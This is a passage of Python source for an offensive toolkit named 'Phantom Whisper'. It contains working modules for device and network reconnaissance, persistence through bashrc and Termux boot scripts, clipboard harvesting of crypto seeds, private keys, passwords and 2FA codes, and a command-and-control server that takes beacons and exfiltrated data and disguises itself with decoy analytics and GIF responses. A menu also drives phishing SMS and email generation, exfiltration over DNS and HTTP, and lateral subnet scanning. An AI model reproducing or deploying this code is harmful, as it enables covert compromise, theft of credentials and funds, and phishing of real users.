            out = subprocess.run(["iw","dev","scan"],capture_output=True,text=True,timeout=15).stdout
            ssid,bssid,sig="","",0
            for line in out.splitlines():
                l=line.strip()
                if l.startswith("BSS "):
                    if ssid: r.append({"ssid":ssid,"bssid":bssid,"signal":sig}); ssid,bssid,sig="","",0
                    bssid=l.split()[1].strip("(")
                elif "signal:" in l:
                    try: sig=float(l.split()[1])
                    except: pass
                elif l.startswith("SSID:"): ssid=l.split(":",1)[1].strip()
            if ssid: r.append({"ssid":ssid,"bssid":bssid,"signal":sig})
        except: pass
        return r
    def arp(self) -> List[dict]:
        r = []
        try:
            out = subprocess.run(["ip","neigh","show"],capture_output=True,text=True,timeout=5).stdout
            for line in out.splitlines():
                p = line.split()
                if len(p)>=5 and p[0]!="fe80::1":
                    r.append({"ip":p[0],"mac":p[4] if len(p)>4 and p[3]=="lladdr" else "incomplete"})
        except: pass
        return r
    def bt(self) -> List[dict]:
        r = []
        try:
            out = subprocess.run(["bluetoothctl","--timeout","3","devices"],capture_output=True,text=True,timeout=5).stdout
            for line in out.splitlines():
                if "Device" in line:
                    p = line.split("Device ",1)
                    if len(p)>1:
                        rest = p[1].split(" ",1)
                        r.append({"mac":rest[0].strip(),"name":rest[1].strip() if len(rest)>1 else "Unknown"})
        except: pass
        return r
    def procs(self, n: int = 30) -> List[dict]:
        r = []
        try:
            out = subprocess.run(["ps","aux","--sort=-%cpu"],capture_output=True,text=True,timeout=5).stdout
            for line in out.splitlines()[1:n+1]:
                p=line.split(None,10)
                if len(p)>=11: r.append({"user":p[0],"pid":p[1],"cpu":p[2],"mem":p[3],"cmd":p[10][:60]})
        except: pass
        return r
    async def full(self) -> Dict[str,Any]:
        with Progress(SpinnerColumn(),TextColumn("[cyan]Gathering intel..."),transient=True) as p:
            p.add_task("",total=1)
            return {"hostname":socket.gethostname(),"timestamp":datetime.now().isoformat(),
                    "interfaces":self.interfaces(),"wifi":self.wifi(),"arp":self.arp(),"bt":self.bt(),"procs":self.procs()}

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 16: ANDROID PERSISTENCE
# ═══════════════════════════════════════════════════════════════════════════════

class Persist:
    def __init__(self):
        self.is_termux = "com.termux" in os.environ.get("PREFIX","")
    def bashrc(self, script: str) -> bool:
        try:
            b = HOME/".bashrc"; script_path = Path(script).absolute()
            # 1. Add alias for easy access
            alias_entry = f"\nalias phantom='python3 {script_path}'\n"
            # 2. Add auto-start entry (optional, but keeping it as requested)
            autostart_entry = f"\n# Phantom Whisper Auto-Start\nif [ -f {script_path} ] && [ -z \"$PW_RUNNING\" ]; then export PW_RUNNING=1; python3 {script_path} &; fi\n"
            
            content = b.read_text() if b.exists() else ""
            if "alias phantom=" not in content: content += alias_entry
            if "# Phantom Whisper Auto-Start" not in content: content += autostart_entry
            
            b.write_text(content)
            
            # Also try to create a symlink in /usr/local/bin if possible (Linux) or ~/../usr/bin (Termux)
            try:
                bin_dir = Path(os.environ.get("PREFIX", "/usr/local")) / "bin"
                link_path = bin_dir / "phantom"
                if not link_path.exists():
                    subprocess.run(["ln", "-s", str(script_path), str(link_path)], capture_output=True)
                    subprocess.run(["chmod", "+x", str(link_path)], capture_output=True)
            except: pass
            
            return True
        except: return False
    def termux_boot(self, script: str) -> bool:
        try:
            d = HOME/".termux"/"boot"; d.mkdir(parents=True,exist_ok=True)
            s = d/"phantom.sh"; s.write_text(f"#!/data/data/com.termux/files/usr/bin/bash\ncd {script.parent}\npython {script} --daemon &\n"); s.chmod(0o755)
            return True
        except: return False
    def install(self, script: str) -> Dict[str,bool]:
        r = {"bashrc":self.bashrc(script)}; log(f"Persistence: bashrc={r['bashrc']}")
        if self.is_termux: r["termux_boot"] = self.termux_boot(script)
        return r

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 17: AUTONOMOUS AGENT
# ═══════════════════════════════════════════════════════════════════════════════

class AutoAgent:
    def __init__(self):
        self.state="idle"; self.targets: List[dict] = []; self.harvested: List[dict] = []; self.clip = None
    def set_recon(self, data: dict): self.recon_data = data
    def decide(self) -> Dict[str,Any]:
        if self.clip:
            r = self.clip.poll()
            if r:
                self.harvested.append(r)
                return {"action":"harvest","data":r,"priority":"high","reason":"Sensitive clipboard data"}
        if self.targets:
            t = self.targets.pop(0)
            return {"action":"scan","target":t,"priority":"medium","reason":f"Target: {t.get('ip',t.get('ssid','?'))}"}
        return {"action":"beacon","priority":"low","reason":"Heartbeat"}

# ═══════════════════════════════════════════════════════════════════════════════
# C2 SERVER (built-in)
# ═══════════════════════════════════════════════════════════════════════════════

class Agent:
    def __init__(self, aid: str, host: str = "", ip: str = ""):
        self.id=aid; self.hostname=host; self.ip=ip; self.first=datetime.now().isoformat(); self.last=datetime.now().isoformat(); self.beacons=0
    def dict(self) -> dict:
        return {"id":self.id,"hostname":self.hostname,"ip":self.ip,"first_seen":self.first,"last_seen":self.last,"beacons":self.beacons}

class C2Server:
    def __init__(self, host: str = "0.0.0.0", http_port: int = 8080, ws_port: int = 8081):
        self.host=host; self.http_port=http_port; self.ws_port=ws_port; self.crypto=Crypto()
        self.agents: Dict[str,Agent]={}; self.commands: Dict[str,List[dict]]={}; self.exfil: List[dict]=[]
        self.ws_clients: set=set(); self._stats={"beacons":0,"exfils":0,"commands":0}

    def _beacon(self, aid: str, data: dict) -> List[dict]:
        if aid not in self.agents:
            self.agents[aid]=Agent(aid,data.get("hostname",""),data.get("ip",""))
            log(f"Agent: {aid} ({data.get('hostname','?')})")
        else:
            a=self.agents[aid]; a.last=datetime.now().isoformat(); a.ip=data.get("ip",a.ip); a.hostname=data.get("hostname",a.hostname)
        self.agents[aid].beacons+=1; self._stats["beacons"]+=1; self._bcast({"type":"stats","stats":self._stats})
        return self.commands.pop(aid,[])

    def _bcast(self, data: dict):
        if not self.ws_clients: return
        msg = json.dumps(data, default=str)
        for ws in list(self.ws_clients):
            try: asyncio.run_coroutine_threadsafe(ws.send(msg), self._loop)
            except: self.ws_clients.discard(ws)

    async def _http(self, reader, writer):
        try:
            data = b""
            while b"\r\n\r\n" not in data:
                c = await asyncio.wait_for(reader.read(4096), timeout=10)
                if not c: break
                data += c
            req = data.decode("utf-8",errors="replace"); lines = req.split("\r\n")
            if not lines: writer.close(); return
            method, path, _ = lines[0].split(" ",2)
            bs = req.find("\r\n\r\n")+4; body = req[bs:] if bs < len(req) else ""
            resp = await self._route(method, path, body)
            writer.write(resp); await writer.drain()
        except: pass
        finally:
            try: writer.close()
            except: pass

    async def _route(self, method: str, path: str, body: str) -> bytes:
        try:
            if path == "/api/v1/beacon" and method == "POST":
                p = self.crypto.decrypt_json(body); aid = p.get("agent_id","?"); cmds = self._beacon(aid, p)
                r = self.crypto.encrypt_json({"status":"ok","commands":cmds})
                return f"HTTP/1.1 200 OK\r\nContent-Length: {len(r)}\r\n\r\n{r}".encode()
            elif path == "/api/v1/agents":
                r = json.dumps({"agents":[a.dict() for a in self.agents.values()]}).encode()
                return f"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {len(r)}\r\n\r\n".encode()+r
            elif path.startswith("/api/v1/command/") and method == "POST":
                aid = path.split("/")[-1]; cmd = json.loads(body)
                if aid not in self.commands: self.commands[aid]=[]
                self.commands[aid].append(cmd); self._stats["commands"]+=1; log(f"Cmd queued for {aid}: {cmd.get('action','?')}")
                return b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n"
            elif path == "/api/v1/exfil" and method == "POST":
                p = self.crypto.decrypt_json(body); self.exfil.append(p)
                (DATA_DIR/f"exfil_{p.get('agent_id','?')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json").write_text(json.dumps(p,indent=2))
                self._stats["exfils"]+=1; log(f"Exfil from {p.get('agent_id','?')}")
                return b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n"
            elif path == "/analytics/collect" and method == "POST":
                try: self.exfil.append(self.crypto.decrypt_json(body))
                except: pass
                return b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n"
            elif path.startswith("/assets/images/"):
                return b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n"
            elif path == "/api/v1/dashboard":
                h = self._dash(); return f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(h)}\r\n\r\n{h}".encode()
            elif path == "/api/v1/status":
                s=json.dumps({"version":VERSION,"agents":len(self.agents),"beacons":self._stats["beacons"],"exfils":self._stats["exfils"],
                              "commands":sum(len(v) for v in self.commands.values())}).encode()
                return f"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {len(s)}\r\n\r\n".encode()+s
        except: pass
        g = b"GIF89a\x01\x00\x01\x00\x80\x01\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
        return f"HTTP/1.1 200 OK\r\nContent-Type: image/gif\r\nContent-Length: {len(g)}\r\n\r\n".encode()+g

    def _dash(self) -> str:
        agents_html = "".join(f'<tr><td style="color:#FF00FF">{a.id}</td><td>{a.hostname}</td><td style="color:#0080FF">{a.ip}</td><td style="color:#FFFF00">{a.beacons}</td></tr>' for a in self.agents.values())
        exfil_html = "".join(f'<div class="exfil">{json.dumps(e,default=str)[:200]}</div>' for e in self.exfil[-20:])
        return f"""<!DOCTYPE html><html><head><title>PW C2</title><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<script src="https://cdn.jsdelivr.net/npm/chart.js@4"></script>
<style>*{{margin:0;padding:0;box-sizing:border-box}}body{{background:linear-gradient(135deg,#0a0a12,#1a1a2e);color:#e0e0e0;font-family:'Courier New',monospace;padding:20px}}
h1{{color:#FF00FF;text-shadow:0 0 20px rgba(255,0,255,.3);border-bottom:2px solid #FF00FF;padding-bottom:10px;margin-bottom:20px}}
.stats{{display:flex;gap:10px;flex-wrap:wrap;margin:15px 0}}
.stat{{flex:1;min-width:100px;background:#111;border:1px solid #333;border-radius:8px;padding:15px;text-align:center}}
.stat-num{{font-size:2em;font-weight:bold;color:#FF00FF}}
.stat-label{{color:#888;font-size:.8em}}
.card{{background:rgba(17,17,17,.9);border:1px solid #333;border-radius:8px;padding:15px;margin:15px 0;backdrop-filter:blur(10px)}}
table{{width:100%;border-collapse:collapse}}th{{background:#1a1a2e;color:#00FFFF;padding:10px;text-align:left}}td{{padding:8px 10px;border-bottom:1px solid #333}}
.exfil{{border-left:3px solid #FF0000;padding:6px 10px;margin:4px 0;font-size:.85em;background:#0d0d1a}}
canvas{{max-height:200px}}
</style></head><body>
<h1>🔮 Phantom Whisper C2 v{VERSION}</h1>
<div class="stats">
<div class="stat"><div class="stat-num">{len(self.agents)}</div><div class="stat-label">Agents</div></div>
<div class="stat"><div class="stat-num">{self._stats['beacons']}</div><div class="stat-label">Beacons</div></div>
<div class="stat"><div class="stat-num">{self._stats['exfils']}</div><div class="stat-label">Exfil</div></div>
<div class="stat"><div class="stat-num">{sum(len(v) for v in self.commands.values())}</div><div class="stat-label">Commands</div></div>
</div>
<div class="card"><h2 style="color:#00FFFF;margin-bottom:10px">📡 Agents</h2>
<table><tr><th>ID</th><th>Hostname</th><th>IP</th><th>Beacons</th></tr>{agents_html or '<tr><td colspan="4" style="color:#666;text-align:center">Waiting...</td></tr>'}</table></div>
<div class="card"><h2 style="color:#00FFFF;margin-bottom:10px">📊 Activity</h2><canvas id="chart"></canvas></div>
<div class="card"><h2 style="color:#00FFFF;margin-bottom:10px">📤 Exfil Stream</h2>{exfil_html or '<div style="color:#666">No data</div>'}</div>
<div class="card"><button onclick="fetch('/api/v1/agents/clear',{{method:'POST'}}).then(()=>location.reload())" style="background:#FF00FF;color:#fff;border:none;padding:8px 20px;border-radius:4px;cursor:pointer">Clear Agents</button>
<button onclick="location.reload()" style="background:#00FFFF;color:#000;border:none;padding:8px 20px;border-radius:4px;cursor:pointer;margin-left:10px">Refresh</button></div>
<script>new Chart(document.getElementById('chart'),{{type:'line',data:{{labels:['Agents','Beacons','Exfil','Cmds'],
datasets:[{{label:'Activity',data:[{len(self.agents)},{self._stats['beacons']},{self._stats['exfils']},{sum(len(v) for v in self.commands.values())}],
backgroundColor:['rgba(255,0,255,.2)','rgba(0,255,255,.2)','rgba(255,0,0,.2)','rgba(255,255,0,.2)'],
borderColor:['#FF00FF','#00FFFF','#FF0000','#FFFF00'],borderWidth:2}}]}},options:{{plugins:{{legend:{{labels:{{color:'#e0e0e0'}}}}}}}}}});
setTimeout(function(){{location.reload()}},5000);</script></body></html>"""

    async def _ws_handler(self, ws, path=None):
        self.ws_clients.add(ws); log("WS client connected")
        try:
            await ws.send(json.dumps({"type":"hello","version":VERSION}))
            for a in self.agents.values(): await ws.send(json.dumps({"type":"agent","agent":a.dict()}))
            await ws.send(json.dumps({"type":"stats","stats":self._stats}))
            async for msg in ws:
                try:
                    d = json.loads(msg)
                    if d.get("type")=="command": self.commands.setdefault(d["agent_id"],[]).append(d["command"])
                    elif d.get("type")=="ping": await ws.send(json.dumps({"type":"pong"}))
                except: pass
        except: pass
        finally: self.ws_clients.discard(ws)

    async def _start_http(self):
        s = await asyncio.start_server(self._http, self.host, self.http_port)
        print(f"\n╔{'═'*50}╗\n║  Phantom Whisper C2 v{VERSION}{' '*(26-len(VERSION))}║")
        print(f"║  Dashboard: http://{self.host}:{self.http_port}/api/v1/dashboard  ║")
        print(f"║  API:       http://{self.host}:{self.http_port}/api/v1/          ║")
        if self.ws_port: print(f"║  WebSocket: ws://{self.host}:{self.ws_port}/ws            ║")
        print(f"╚{'═'*50}╝\n"); log(f"C2 Server on {self.host}:{self.http_port}")
        async with s: await s.serve_forever()

    async def _start_ws(self):
        if not HAS_WS: return
        async with websockets.serve(self._ws_handler, self.host, self.ws_port):
            log(f"WS on {self.host}:{self.ws_port}"); await asyncio.Future()

    async def start_all(self):
        self._loop = asyncio.get_event_loop()
        tasks = [self._start_http()]
        if HAS_WS: tasks.append(self._start_ws())
        await asyncio.gather(*tasks)

    def start(self): asyncio.run(self.start_all())
    def start_bg(self): t=threading.Thread(target=self.start,daemon=True); t.start(); time.sleep(1); return t

# ═══════════════════════════════════════════════════════════════════════════════
# MAIN APP
# ═══════════════════════════════════════════════════════════════════════════════

class App:
    def __init__(self):
        self.id = hashlib.sha256(f"{socket.gethostname()}:{os.environ.get('USER','?')}".encode()).hexdigest()[:12]
        self.dns = DNSTunnel(config.get("c2.dns_tunnel_domain","c2.local"))
        self.http = HTTPMimic(config.get("c2.http_fallback","http://127.0.0.1:8080"))
        self.stego = Stego(); self.screenshot = Screenshot(); self.ws_c2 = WSC2(); self.geo = GeoIP()
        self.fb = FileBrowser(); self.plugins = Plugins(); self.updater = Updater()
        self.phish = Phish(); self.recon = Recon(); self.persist = Persist()
        self.agent = AutoAgent(); self.clip = ClipMon(); self.net = NetScan()
        self.scanner = PortScanner(); self.c2 = C2Server(); self.plugins.scan()

    def _header(self) -> Text:
        t=Text()
        t.append("  ██████  ██   ██  █████   ███    ██  ██████  ███    ██  \n",style="bold magenta")
        t.append("  ██   ██ ██   ██ ██   ██ ████   ██ ██      ████   ██  \n",style="bright_cyan")
        t.append("  ██████  ███████ ███████ ██ ██  ██ ██      ██ ██  ██  \n",style="bold magenta")
        t.append("  ██      ██   ██ ██   ██ ██  ██ ██ ██      ██  ██ ██  \n",style="bright_cyan")
        t.append("  ██      ██   ██ ██   ██ ██   ████  ██████ ██   ████  \n",style="bold magenta")
        t.append("\n",style="bold magenta")
        t.append("  ██    ██ ██   ██ ██ ██████  ██████  ██████  ██████   \n",style="bright_cyan")
        t.append("  ██    ██ ██   ██ ██ ██   ██ ██   ██ ██   ██ ██   ██  \n",style="bold magenta")
        t.append("  ██    ██ ███████ ██ ██████  ██████  ██████  ██████   \n",style="bright_cyan")
        t.append("   ██████  ██   ██ ██ ██      ██   ██ ██   ██ ██   ██  \n",style="bold magenta")
        t.append(f"\nv{VERSION} — MONOLITHIC ULTIMATE EDITION\n",style="cyan")
        return t

    def _info(self) -> Panel:
        return Panel(f"[cyan]DID:[/cyan] {self.id}  [cyan]Host:[/cyan] {socket.gethostname()}  [cyan]Time:[/cyan] {datetime.now().strftime('%H:%M:%S')}",border_style="cyan")

    def _menu(self) -> Table:
        m=Table(show_header=False,box=box.MINIMAL,border_style="dim")
        m.add_column("K",style="bold cyan"); m.add_column("Option",style="white"); m.add_column("Description",style="dim")
        m.add_row("[bold cyan]1.[/bold cyan]","[white]Social Engineering[/white]","[dim]AI Phishing, SMS, Email[/dim]")
        m.add_row("[bold cyan]2.[/bold cyan]","[white]C2 Operations[/white]","[dim]Beacon, Server, Commands[/dim]")
        m.add_row("[bold cyan]3.[/bold cyan]","[white]Persistence[/white]","[dim]Auto-start, Android, Linux[/dim]")
        m.add_row("[bold cyan]4.[/bold cyan]","[white]Clipboard Monitor[/white]","[dim]Sensitive Data Detection[/dim]")
        m.add_row("[bold cyan]5.[/bold cyan]","[white]Reconnaissance[/white]","[dim]Network, Device, Ports[/dim]")
        m.add_row("[bold cyan]6.[/bold cyan]","[white]Auto Mode[/white]","[dim]AI Decision Engine[/dim]")
        m.add_row("[bold cyan]7.[/bold cyan]","[white]Data Exfiltration[/white]","[dim]Send Data via C2 Channels[/dim]")
        m.add_row("[bold cyan]8.[/bold cyan]","[white]Lateral Movement[/white]","[dim]Subnet Scan, Pivot[/dim]")
        m.add_row("[bold cyan]9.[/bold cyan]","[white]Steganography[/white]","[dim]Hide Data in Images[/dim]")
        m.add_row("[bold cyan]S.[/bold cyan]","[white]Screenshot[/white]","[dim]Capture Screen[/dim]")
        m.add_row("[bold cyan]P.[/bold cyan]","[white]Plugins[/white]","[dim]Manage & Run Extensions[/dim]")
        m.add_row("[bold cyan]U.[/bold cyan]","[white]Update[/white]","[dim]Check for New Versions[/dim]")
        m.add_row("[bold cyan]C.[/bold cyan]","[white]Configuration[/white]","[dim]Edit Settings[/dim]")
        m.add_row("[bold cyan]A.[/bold cyan]","[white]Termux Setup[/white]","[dim]Install Env & 'phantom' command[/dim]")
        m.add_row("[bold red]0.[/bold red]","[white]Exit[/white]","[dim]Shutdown Framework[/dim]")
        return m

    def _phishing(self):
        console.print(Panel("[bold cyan]🎭 Social Engineering[/bold cyan]",border_style="cyan"))
        t=Table(show_header=True,header_style="bold cyan",box=box.MINIMAL)
        t.add_column("#",style="dim"); t.add_column("Scenario")
        targets = ["Bank","Netflix","Google","Apple","PayPal","Corporate","Shipping","Crypto","Custom"]
        for i,sc in enumerate(targets,1): t.add_row(str(i),sc)
        console.print(t); c = Prompt.ask("Select",choices=[str(i) for i in range(1,len(targets)+1)]+['b'],default='b')
        if c=='b': return
        ctx = targets[int(c)-1].lower(); name = Prompt.ask("Target name",default="User")
        console.print(f"\n[bold yellow]SMS:[/bold yellow]\n"); console.print(Panel(self.phish.generate_sms(ctx,name),border_style="red"))
        e = self.phish.generate_email(ctx,name); console.print(f"\n[bold yellow]Email:[/bold yellow]\n[dim]Subject:[/dim] {e['subject']}");
        console.print(Panel(e['body'],border_style="yellow")); log(f"Phishing: {ctx}/{name}")

    def _c2(self):
        console.print(Panel("[bold cyan]🌐 C2 Operations[/bold cyan]",border_style="cyan"))
        t=Table(show_header=True,header_style="bold cyan",box=box.MINIMAL)
        t.add_column("#",style="dim"); t.add_column("Op"); t.add_column("Desc")
        t.add_row("1","Start C2 Server","Run local C2 (HTTP+WS)");
        t.add_row("2","DNS Beacon","Send beacon via DNS");
        t.add_row("3","HTTP Beacon","Send beacon via HTTP");
        t.add_row("4","Server Status","Show agent list");
        t.add_row("5","Queue Command","Send cmd to agent");
        t.add_row("6","Exfil Data","View collected data");
        console.print(t); c=Prompt.ask("Select",choices=['1','2','3','4','5','6','b'],default='b')
        if c=='b': return
        if c=='1':
            self.c2 = C2Server(); self.c2.start_bg()
            console.print("[bold green]✓ C2 Server running[/bold green]")
            console.print(f"[dim]  http://0.0.0.0:{config.get('c2.http_port',8080)}/api/v1/dashboard[/dim]")
        elif c=='2':
            r=self.dns.beacon(self.id,{"agent_id":self.id,"hostname":socket.gethostname(),"timestamp":datetime.now().isoformat()})
            if r: console.print(f"[green]Response: {json.dumps(r,indent=2)}[/green]")
            else: console.print("[yellow]No response[/yellow]")
        elif c=='3':
            r=self.http.poll(self.id)
            if r: console.print(f"[green]Commands: {json.dumps(r,indent=2)}[/green]")
            else: console.print("[yellow]No commands[/yellow]")
        elif c=='4':
            s=self.c2._stats; console.print(f"[cyan]Agents:[/cyan] {len(self.c2.agents)}")
            console.print(f"[cyan]Beacons:[/cyan] {s['beacons']}  [cyan]Exfil:[/cyan] {s['exfils']}  [cyan]Cmds:[/cyan] {s['commands']}")
            for a in self.c2.agents.values(): console.print(f"  [dim]{a.id}[/dim] — {a.hostname} @ {a.ip} ({a.beacons})")
        elif c=='5':
            aid=Prompt.ask("Agent ID"); act=Prompt.ask("Action",default="shell")
            self.c2.commands.setdefault(aid,[]).append({"action":act,"params":{},"ts":datetime.now().isoformat()})
            console.print(f"[green]✓ Command queued for {aid}[/green]")
        elif c=='6':
            for e in self.c2.exfil[-10:]: console.print(Panel(json.dumps(e,default=str)[:300],border_style="red"))

    def _persist(self):
        r=self.persist.install(str(SELF_PATH))
        for k,v in r.items(): console.print(f"  {'[green]✓' if v else '[dim]✗'} {k}")

    def _clip(self):
        console.print(Panel("[bold cyan]🔓 Clipboard Monitor[/bold cyan]",border_style="cyan"))
        console.print("Patterns: BTC, ETH, API Keys, Private Keys, Seeds, Emails, Passwords, Phones, 2FA Codes\n")
        c=Prompt.ask("Action",choices=['1','2','3','b'],default='b')
        if c=='b': return
        if c=='1':
            r=self.clip.poll()
            if r:
                console.print("[bold red]⚠ Detected![/bold red]")
                for l,v in r["detections"]: console.print(f"  [red]{l}:[/red] {v}")
            else: console.print("[dim]Nothing new[/dim]")
        elif c=='2':
            def cb(e): console.print(f"\n[bold red]⚠ Clip: {e['detections'][0][0]}[/bold red]")
            self.clip.start(callback=cb); console.print("[green]✓ Monitoring... Enter to stop[/green]"); input(); self.clip.stop()
        elif c=='3':
            for e in self.clip.history[-5:]: console.print(f"  [dim]{e['timestamp']}[/dim] — {e['detections']}")

    def _recon(self):
        console.print(Panel("[bold cyan]🕵️ Reconnaissance[/bold cyan]",border_style="cyan"))
        t=Table(show_header=True,header_style="bold cyan",box=box.MINIMAL)
        t.add_column("#",style="dim"); t.add_column("Op")
        for i,op in enumerate(["Full Recon","Interfaces","WiFi","ARP","Bluetooth","Processes","Port Scan","Ping Sweep"],1):
            t.add_row(str(i),op)
        console.print(t); c=Prompt.ask("Select",choices=[str(i) for i in range(1,9)]+['b'],default='b')
        if c=='b': return
        async def full(): console.print(Panel(json.dumps(await self.recon.full(),indent=2,default=str)[:2000],title="[cyan]Recon[/cyan]"))
        if c=='1': asyncio.run(full())
        elif c=='2':
            for i in self.recon.interfaces(): console.print(f"  {i['name']:10s} {i.get('ip','-'):16s} {i.get('mac','-'):18s} {i.get('state','?')}")
        elif c=='3':
            for n in self.recon.wifi(): console.print(f"  {n.get('ssid','?'):30s} {n.get('bssid','?'):18s} {n.get('signal','?')}dBm")
        elif c=='4':
            for d in self.recon.arp(): console.print(f"  {d['ip']:16s} {d.get('mac','?')}")
        elif c=='5':
            for d in self.recon.bt(): console.print(f"  {d.get('name','?'):30s} {d.get('mac','?')}")
        elif c=='6':
            for p in self.recon.procs(15): console.print(f"  {p['pid']:6s} {p['cpu']:5s} {p['mem']:5s} {p['cmd'][:40]}")
        elif c=='7':
            host=Prompt.ask("Target IP"); ports=[int(p.strip()) for p in Prompt.ask("Ports",default="22,80,443,8080,3306,3389,5900").split(",") if p.strip().isdigit()]
            for r in self.scanner.scan(host, ports): console.print(f"  {r['port']:5d} {r['service']:15s} {r.get('banner','')[:30]}")
        elif c=='8':
            s=Prompt.ask("Subnet",default="192.168.1.0/24")
            for h in self.net.ping_sweep(s): console.print(f"  {h}")

    def _auto(self):
        d=self.agent.decide(); console.print(f"[cyan]Action:[/cyan] {d['action']}  [cyan]Priority:[/cyan] {d['priority']}  [cyan]Reason:[/cyan] {d['reason']}")

    def _exfil(self):
        c=Prompt.ask("Method",choices=['1','2','3','b'],default='b')
        if c=='b': return
        data={"agent_id":self.id,"timestamp":datetime.now().isoformat(),"hostname":socket.gethostname()}
        dt=Prompt.ask("Data type",choices=['clipboard','recon','custom'],default='clipboard')
        if dt=='clipboard': data["payload"]=self.clip.poll() or {"note":"none"}; data["type"]="clipboard"
        elif dt=='recon': data["payload"]={"interfaces":self.recon.interfaces(),"wifi":self.recon.wifi()}; data["type"]="recon"
        else: data["payload"]={"raw":Prompt.ask("Data")}; data["type"]="custom"
        if c=='1': ok=self.dns.exfil(self.id,"exfil",data)
        elif c=='2': ok=self.http.send(self.id,"exfil",data)
        else:
            p=DATA_DIR/f"exfil_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"; p.write_text(json.dumps(data,indent=2,default=str))
            console.print(f"[green]✓ Saved: {p}[/green]"); return
        console.print(f"{'[green]✓ Sent' if ok else '[red]✗ Failed'}")

    def _lateral(self):
        s=Prompt.ask("Subnet",default="192.168.1.0/24"); base=s.rsplit(".",1)[0]
        ports = [22,23,80,443,445,3389,5900,8080,8443,3306,5432,6379,27017]
        for i in range(1,255):
            ip=f"{base}.{i}"; ops=self.scanner.scan(ip,ports)
            if ops: console.print(f"  [green]{ip}[/green] — {len(ops)} ports"); log(f"Lateral: {ip} {ops}")

    def _stego(self):
        console.print(Panel("[bold cyan]🖼️ Steganography[/bold cyan]",border_style="cyan"))
        if not HAS_PIL: console.print("[red]✗ Requires: pip install pillow[/red]"); return
        c=Prompt.ask("Encode or Decode?",choices=['encode','decode','b'],default='b')
        if c=='b': return
        if c=='encode':
            img=Prompt.ask("Image path"); msg=Prompt.ask("Message to hide")
            out=self.stego.encode(img,msg.encode())
            if out: console.print(f"[green]✓ Hidden in: {out}[/green]")
            else: console.print("[red]✗ Failed (image too small?)[/red]")
        else:
            img=Prompt.ask("Image path"); data=self.stego.decode(img)
            if data: console.print(f"[green]✓ Extracted: {data.decode('utf-8',errors='replace')}[/green]")
            else: console.print("[red]✗ No hidden data found[/red]")

    def _screenshot(self):
        console.print("[yellow][*] Capturing screen...[/yellow]")
        p=self.screenshot.capture()
        if p: console.print(f"[green]✓ Saved: {p}[/green]")
        else: console.print("[red]✗ No screenshot backend available[/red]")

    def _plugins(self):
        self.plugins.scan(); console.print(f"[cyan]Plugins found: {len(self.plugins.plugins)}[/cyan]")
        for n,p in self.plugins.plugins.items(): console.print(f"  [green]{n}[/green] — {p['description']}")
        c=Prompt.ask("Run?",choices=list(self.plugins.plugins.keys())+['all','b'],default='b')
        if c=='b': return
        if c=='all':
            for n,r in self.plugins.run_all(self).items(): console.print(f"  [green]{n}:[/green] {json.dumps(r,default=str)[:200]}")
        else:
            r=self.plugins.run(c,self)
            console.print(f"[green]Result:[/green] {json.dumps(r,default=str)[:500]}")

    def _update(self):
        console.print("[yellow][*] Checking for updates...[/yellow]")
        r=self.updater.check()
        if r:
            console.print(f"[cyan]Current:[/cyan] {r['current']}  [cyan]Latest:[/cyan] {r['latest']}  [cyan]Update:[/cyan] {'[bold green]AVAILABLE' if r['available'] else '[dim]Up to date'}[/]")
            if r['available'] and Confirm.ask("Apply update?"):
                if self.updater.update(): console.print("[green]✓ Updated! Restart recommended.[/green]")
                else: console.print("[red]✗ Update failed[/red]")
        else: console.print("[yellow]Could not check[/yellow]")

    def _config(self):
        console.print(Panel("[bold cyan]⚙️ Configuration[/bold cyan]",border_style="cyan"))
        keys=[("C2 DNS Domain","c2.dns_tunnel_domain"),("C2 HTTP Fallback","c2.http_fallback"),("C2 Server Host","c2.c2_server_host"),
              ("HTTP Port","c2.http_port"),("WS Port","c2.ws_port"),("Heartbeat (s)","c2.heartbeat_interval")]
        t=Table(show_header=True,header_style="bold cyan",box=box.MINIMAL)
        t.add_column("#",style="dim"); t.add_column("Key"); t.add_column("Value")
        for i,(l,k) in enumerate(keys,1): t.add_row(str(i),l,str(config.get(k)))
        console.print(t); c=Prompt.ask("Edit #",choices=[str(i) for i in range(1,len(keys)+1)]+['r','b'],default='b')
        if c=='b': return
        if c=='r': config.path.unlink(); config.refresh(); console.print("[green]✓ Reset[/green]")
        else:
            idx=int(c)-1; _,key=keys[idx]; nv=Prompt.ask("New value",default=str(config.get(key)))
            if isinstance(config.get(key),int): config.set(key,int(nv))
            elif isinstance(config.get(key),float): config.set(key,float(nv))
            else: config.set(key,nv); console.print(f"[green]✓ {key}={nv}[/green]")

    async def run(self):
        console.clear(); console.print(self._header()); console.print()
        while True:
            console.print(); console.print(self._info()); console.print(); console.print(Align.center(self._menu())); console.print()
            c=Prompt.ask("[bold cyan]Select[/bold cyan]",choices=['0','1','2','3','4','5','6','7','8','9','S','s','P','p','U','u','C','c','A','a'],default='0')
            console.clear(); console.print(self._header()); console.print()
            if c=='0': break
            elif c.lower()=='a': self._persist()
            elif c=='1': self._phishing()
            elif c=='2': self._c2()
            elif c=='3': self._persist()
            elif c=='4': self._clip()
            elif c=='5': self._recon()
            elif c=='6': self._auto()
            elif c=='7': self._exfil()
            elif c=='8': self._lateral()
            elif c=='9': self._stego()
            elif c.lower()=='s': self._screenshot()
            elif c.lower()=='p': self._plugins()
            elif c.lower()=='u': self._update()
            elif c.lower()=='c': self._config()
            console.print(); Prompt.ask("[dim]Enter to continue[/dim]")

# ═══════════════════════════════════════════════════════════════════════════════
# MAIN ENTRY
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(description=f"Phantom Whisper v{VERSION}")
    parser.add_argument("--server", action="store_true", help="Run C2 server")
